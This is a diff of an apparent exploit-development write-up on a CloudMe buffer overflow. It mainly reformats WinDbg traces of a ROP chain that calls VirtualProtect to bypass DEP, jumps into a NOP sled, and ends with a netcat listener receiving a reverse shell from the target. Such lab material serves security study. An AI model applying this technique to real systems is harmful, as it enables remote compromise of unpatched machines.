@@ -1854,13 +1854,73 @@ except Exception as e:
 Now, after running the exploit, we can see step by step in the debugger the values of the registers
 
 ```
-0:000\> bp 0x68ef1b07 \*\*\* ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Core.dll - 0:000\> bl 0 e 68ef1b07 0001 (0001) 0:\*\*\*\* Qt5Core!ZN8qfloat1613mantissatableE+0x61e7 0:000\> g Breakpoint 0 hit \*\*\* ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\libwinpthread-1.dll - eax=90909090 ebx=00000201 ecx=68ee6b16 edx=00000040 esi=762a20d8 edi=6d9c1011 eip=68ef1b07 esp=0022d704 ebp=6d9c12c9 iopl=0 nv up ei pl nz ac po cy cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000213 Qt5Core!ZN8qfloat1613mantissatableE+0x61e7: 68ef1b07 60 pushad 0:000\> dds esp-70 0022d694 699012c9 Qt5Network+0x12c9 0022d698 0385ff88 0022d69c 68a9559e Qt5Core!Z21qt\_logging\_to\_consolev+0x8e 0022d6a0 68ae4fe3 Qt5Core!ZNK15QDateTimeParser12parseSectionERK9QDateTimeiR7QStringRiiRNS\_5StateEPi+0xdf3 0022d6a4 0362fffc 0022d6a8 68ad422b Qt5Core!ZNK5QTime4hourEv+0x1b 0022d6ac 68ae8a22 Qt5Core!ZNK12QEasingCurve4typeEv+0x2 0022d6b0 68a812c9 Qt5Core+0x12c9 0022d6b4 fffae493 0022d6b8 61ba8137 Qt5Gui!ZN7QWindow4setXEi+0x77 0022d6bc 6d9c23ab Qt5Sql!ZN9QSqlQuery6finishEv+0x1b 0022d6c0 6d9c1011 Qt5Sql+0x1011 0022d6c4 61b63b3c Qt5Gui!ZNK6QImage10rgbSwappedEv+0x1dabc 0022d6c8 68d327ff Qt5Core!ZN16QEventTransition11qt\_metacallEN11QMetaObject4CallEiPPv+0x4f29f 0022d6cc ffffffc0 0022d6d0 41414141 0022d6d4 68cef5b2 Qt5Core!ZN16QEventTransition11qt\_metacallEN11QMetaObject4CallEiPPv+0xc052 0022d6d8 68b1df17 Qt5Core!ZNK7QString7sectionERKS\_ii6QFlagsINS\_11SectionFlagEE+0x157 0022d6dc 68ae7ee3 Qt5Core!ZNK15QDateTimeParser10fromStringERK7QStringP5QDateP5QTime+0x823 0022d6e0 fffffdff 0022d6e4 6d9e431a Qt5Sql!ZN24QSqlRelationalTableModel11qt\_metacallEN11QMetaObject4CallEiPPv+0x28a 0022d6e8 68aad07c Qt5Core!ZN9QBitArrayaNERKS\_+0x19c 0022d6ec 6d9c12c9 Qt5Sql+0x12c9 0022d6f0 6d9c12c9 Qt5Sql+0x12c9 0022d6f4 6fe4dc57 libstdc\_\_\_6!\_gcclibcxx\_demangle\_callback+0xec7 0022d6f8 90909090 0022d6fc 68ee6b16 Qt5Core!ZN13QStateMachine16staticMetaObjectE+0x11aa 0022d700 68ef1b07 Qt5Core!ZN8qfloat1613mantissatableE+0x61e7 0022d704 64b4d6cd libwinpthread\_1!pthread\_detach+0xd 0022d708 90909090 0022d70c 90909090 0022d710 90909090
+0:000> bp 0x68ef1b07
+*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Core.dll - 
+0:000> bl
+0 e 68ef1b07 0001 (0001) 0:**** Qt5Core!ZN8qfloat1613mantissatableE+0x61e7
+0:000> g
+Breakpoint 0 hit
+*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\libwinpthread-1.dll - 
+eax=90909090 ebx=00000201 ecx=68ee6b16 edx=00000040 esi=762a20d8 edi=6d9c1011
+eip=68ef1b07 esp=0022d704 ebp=6d9c12c9 iopl=0 nv up ei pl nz ac po cy
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000213
+Qt5Core!ZN8qfloat1613mantissatableE+0x61e7:
+68ef1b07 60 pushad
+0:000> dds esp-70
+0022d694 699012c9 Qt5Network+0x12c9
+0022d698 0385ff88
+0022d69c 68a9559e Qt5Core!Z21qt_logging_to_consolev+0x8e
+0022d6a0 68ae4fe3 Qt5Core!ZNK15QDateTimeParser12parseSectionERK9QDateTimeiR7QStringRiiRNS_5StateEPi+0xdf3
+0022d6a4 0362fffc
+0022d6a8 68ad422b Qt5Core!ZNK5QTime4hourEv+0x1b
+0022d6ac 68ae8a22 Qt5Core!ZNK12QEasingCurve4typeEv+0x2
+0022d6b0 68a812c9 Qt5Core+0x12c9
+0022d6b4 fffae493
+0022d6b8 61ba8137 Qt5Gui!ZN7QWindow4setXEi+0x77
+0022d6bc 6d9c23ab Qt5Sql!ZN9QSqlQuery6finishEv+0x1b
+0022d6c0 6d9c1011 Qt5Sql+0x1011
+0022d6c4 61b63b3c Qt5Gui!ZNK6QImage10rgbSwappedEv+0x1dabc
+0022d6c8 68d327ff Qt5Core!ZN16QEventTransition11qt_metacallEN11QMetaObject4CallEiPPv+0x4f29f
+0022d6cc ffffffc0
+0022d6d0 41414141
+0022d6d4 68cef5b2 Qt5Core!ZN16QEventTransition11qt_metacallEN11QMetaObject4CallEiPPv+0xc052
+0022d6d8 68b1df17 Qt5Core!ZNK7QString7sectionERKS_ii6QFlagsINS_11SectionFlagEE+0x157
+0022d6dc 68ae7ee3 Qt5Core!ZNK15QDateTimeParser10fromStringERK7QStringP5QDateP5QTime+0x823
+0022d6e0 fffffdff
+0022d6e4 6d9e431a Qt5Sql!ZN24QSqlRelationalTableModel11qt_metacallEN11QMetaObject4CallEiPPv+0x28a
+0022d6e8 68aad07c Qt5Core!ZN9QBitArrayaNERKS_+0x19c
+0022d6ec 6d9c12c9 Qt5Sql+0x12c9
+0022d6f0 6d9c12c9 Qt5Sql+0x12c9
+0022d6f4 6fe4dc57 libstdc___6!_gcclibcxx_demangle_callback+0xec7
+0022d6f8 90909090
+0022d6fc 68ee6b16 Qt5Core!ZN13QStateMachine16staticMetaObjectE+0x11aa
+0022d700 68ef1b07 Qt5Core!ZN8qfloat1613mantissatableE+0x61e7
+0022d704 64b4d6cd libwinpthread_1!pthread_detach+0xd
+0022d708 90909090
+0022d70c 90909090
+0022d710 90909090
 ```
 
 As we see, after the **PUSHAD** instruction is executed, all of the registers are pushed on the stack in specific order that is necessary to successfully execute the **VirtualProtect**. If we continue the execution, we enter the **kernel32!VirtualProtect** function and disable DEP for the memory region just below the **PUSHAD** ROP chain:
 
 ```
-eax=90909090 ebx=00000201 ecx=68ee6b16 edx=00000040 esi=762a20d8 edi=6d9c1011 eip=762a20d8 esp=0022d6ec ebp=6d9c12c9 iopl=0 nv up ei pl nz ac po cy cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000213 kernel32!VirtualProtect: 762a20d8 ff2524192a76 jmp dword ptr [kernel32!\_imp\_\_VirtualProtect (762a1924)] ds:0023:762a1924={KERNELBASE!VirtualProtect (75a522bd)} 0:000\> eax=90909090 ebx=00000201 ecx=68ee6b16 edx=00000040 esi=762a20d8 edi=6d9c1011 eip=75a522bd esp=0022d6ec ebp=6d9c12c9 iopl=0 nv up ei pl nz ac po cy cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000213 KERNELBASE!VirtualProtect: 75a522bd 8bff mov edi,edi 0:000\> eax=90909090 ebx=00000201 ecx=68ee6b16 edx=00000040 esi=762a20d8 edi=6d9c1011 eip=75a522bf esp=0022d6ec ebp=6d9c12c9 iopl=0 nv up ei pl nz ac po cy cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000213 KERNELBASE!VirtualProtect+0x2: 75a522bf 55 push ebp
+eax=90909090 ebx=00000201 ecx=68ee6b16 edx=00000040 esi=762a20d8 edi=6d9c1011
+eip=762a20d8 esp=0022d6ec ebp=6d9c12c9 iopl=0 nv up ei pl nz ac po cy
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000213
+kernel32!VirtualProtect:
+762a20d8 ff2524192a76 jmp dword ptr [kernel32!_imp__VirtualProtect (762a1924)] ds:0023:762a1924={KERNELBASE!VirtualProtect (75a522bd)}
+0:000> 
+eax=90909090 ebx=00000201 ecx=68ee6b16 edx=00000040 esi=762a20d8 edi=6d9c1011
+eip=75a522bd esp=0022d6ec ebp=6d9c12c9 iopl=0 nv up ei pl nz ac po cy
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000213
+KERNELBASE!VirtualProtect:
+75a522bd 8bff mov edi,edi
+0:000> 
+eax=90909090 ebx=00000201 ecx=68ee6b16 edx=00000040 esi=762a20d8 edi=6d9c1011
+eip=75a522bf esp=0022d6ec ebp=6d9c12c9 iopl=0 nv up ei pl nz ac po cy
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000213
+KERNELBASE!VirtualProtect+0x2:
+75a522bf 55 push ebp
 [..snip..]
 ```
 
@@ -1871,89 +1931,89 @@ If we still continue the execution we can see below that now is possible to exec
 eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
 eip=64b4d6cd esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
 cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
-libwinpthread\_1!pthread\_detach+0xd:
+libwinpthread_1!pthread_detach+0xd:
 64b4d6cd ffe4 jmp esp {0022d708}
-0:000\> 
+0:000> 
 eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
 eip=0022d708 esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
 cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
 0022d708 90 nop
-0:000\> 
+0:000> 
 eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
 eip=0022d709 esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
 cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
 0022d709 90 nop
-0:000\> 
+0:000> 
 eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
 eip=0022d70a esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
 cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
 0022d70a 90 nop
-0:000\> 
+0:000> 
 eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
 eip=0022d70b esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
 cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
 0022d70b 90 nop
-0:000\> 
+0:000> 
 eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
 eip=0022d70c esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
 cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
 0022d70c 90 nop
-0:000\> 
+0:000> 
 eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
 eip=0022d70d esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
 cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
 0022d70d 90 nop
-0:000\> 
+0:000> 
 eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
 eip=0022d70e esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
 cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
 0022d70e 90 nop
-0:000\> 
+0:000> 
 eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
 eip=0022d70f esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
 cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
 0022d70f 90 nop
-0:000\> 
+0:000> 
 eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
 eip=0022d710 esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
 cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
 0022d710 90 nop
-0:000\> 
+0:000> 
 eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
 eip=0022d711 esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
 cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
 0022d711 90 nop
-0:000\> 
+0:000> 
 eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
 eip=0022d712 esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
 cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
 0022d712 90 nop
-0:000\> 
+0:000> 
 eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
 eip=0022d713 esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
 cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
 0022d713 90 nop
-0:000\> 
+0:000> 
 eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
 eip=0022d714 esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
 cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
 0022d714 90 nop
-0:000\> 
+0:000> 
 eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
 eip=0022d715 esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
 cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
 0022d715 90 nop
-0:000\> 
+0:000> 
 eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
 eip=0022d716 esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
 cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
 0022d716 90 nop
-0:000\> 
+0:000> 
 eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
 eip=0022d717 esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
 cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
 0022d717 90 nop
-0:000\> 
+0:000> 
 eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
 eip=0022d718 esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
 cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
@@ -1970,7 +2030,7 @@ And yes, as we see above, we have started executing the NOP sled stored in EAX. 
 Before running the exploit script above we have first run our listener on port 443&nbsp;
 
 ```
-nv -nlvp 443&nbsp;
+nv -nlvp 443
 ```
 
 After running the script we will have our shell&nbsp;
@@ -1982,12 +2042,7 @@ connect to [192.168.201.7] from (UNKNOWN) [192.168.201.88] 49900
 Microsoft Windows [Version 6.1.7601]
 Copyright (c) 2009 Microsoft Corporation. All rights reserved.
 
-C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\>
+C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe>
 ```
 
-&nbsp;
-
-<!-- wp:paragraph -->
-
-<!-- /wp:paragraph -->
 
